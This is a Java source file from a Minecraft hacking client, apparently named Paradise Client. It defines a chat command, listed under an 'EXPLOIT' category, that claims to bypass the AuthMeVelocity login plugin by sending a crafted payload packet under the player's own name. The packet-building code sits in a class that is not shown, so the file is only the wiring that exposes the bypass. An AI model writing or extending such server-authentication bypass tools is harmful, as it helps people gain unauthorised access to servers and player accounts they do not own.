package net.paradise_client.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.paradise_client.*;
import net.paradise_client.command.Command;
import net.paradise_client.command.CommandManager;

public class AuthMeVelocityBypassCommand extends Command {
  public AuthMeVelocityBypassCommand() {
    super("authmevelocitybypass", "Bypasses AuthMeVelocity", CommandManager.CommandCategory.EXPLOIT);
  }

  @Override public void build(LiteralArgumentBuilder<CommandSource> root) {
    root.executes(context -> {
      PacketFactory.sendAMV(MinecraftClient.getInstance().getGameProfile().getName());
      Helper.printChatMessage("Payload packet sent!");
      return Command.SINGLE_SUCCESS;
    });
  }
}
